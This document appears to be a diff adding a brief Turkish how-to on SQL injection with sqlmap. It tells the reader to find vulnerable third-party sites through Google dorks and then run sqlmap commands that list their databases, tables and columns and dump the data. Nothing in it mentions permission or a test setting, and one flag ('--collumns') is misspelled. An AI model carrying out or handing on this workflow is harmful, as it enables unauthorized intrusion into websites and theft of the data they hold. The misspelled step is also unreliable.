@@ -1,0 +1,6 @@
+Sqlmap ile SQL Injection:
+    Google'dan sql dorkları bulmamız gerekiyor. Ve bulduğumuz sql dorklarından birini aratarak sql açıklı bir site buluyoruz.
+    ->sqlmap -u "<Sql hatası olan site domaini>" --dbs (Komutu ile veritabanlarını tespit ettik.)
+    ->sqlmap -u "<Sql hatası olan site domaini>" -D <Veritabanı ismi> --tables (Komutu ile veritabanındaki tabloları çektik.)
+    ->sqlmap -u "<Sql hatası olan site domaini>" -D <Veritabanı ismi> -T <Tablonun adı> --collumns (Komutu ile hedeflediğimiz tablonun kolonlarını öğreniyoruz.)
+    ->sqlmap -u "<Sql hatası olan site domaini>" -D <Veritabanı ismi> -T <Tablonun adı> -C <Kolondan çekmek istediğimiz veriler> --dump (Komutu ile tablodan çekmek istediğimiz verilere ulaşıyoruz.)
